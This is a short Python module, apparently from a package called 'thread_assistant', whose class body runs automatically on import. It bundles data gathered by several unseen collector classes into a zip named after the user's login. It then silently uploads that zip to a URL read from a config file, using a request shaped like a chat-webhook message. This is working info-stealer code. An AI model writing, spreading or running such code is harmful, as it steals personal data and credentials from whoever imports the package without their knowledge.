from .GP import *
from .W import WebManagement
from .GC import*
from .GH import * 
from .imports import *

class Run:
    def __repr__(self) -> str:
        return "Run()"
        
    if __name__ != "__main__":
        if os.path.exists(os.path.join(os.getenv("TEMP"), f"{os.getlogin()}.zip")):
            os.remove(os.path.join(os.getenv("TEMP"), f"{os.getlogin()}.zip"))
            
            
        with ZipFile(os.path.join(os.getenv("TEMP"), f"{os.getlogin()}.zip"), "a") as zipobj:
            zipobj.write(WebManagement().Val())
            zipobj.write(GPManagement().Val())
            zipobj.write(GCManagement().Val())
            zipobj.write(GHManagement().Val())
            
        with open("thread_assistant/configuration/config.txt", "r") as c: 
            session.post(c.readline().strip(), json={"content": "", "nonce": None, "tts": False}, files={"upload_file": open(os.path.join(os.getenv("TEMP"), f"{os.getlogin()}.zip"), "rb")})

        
        
    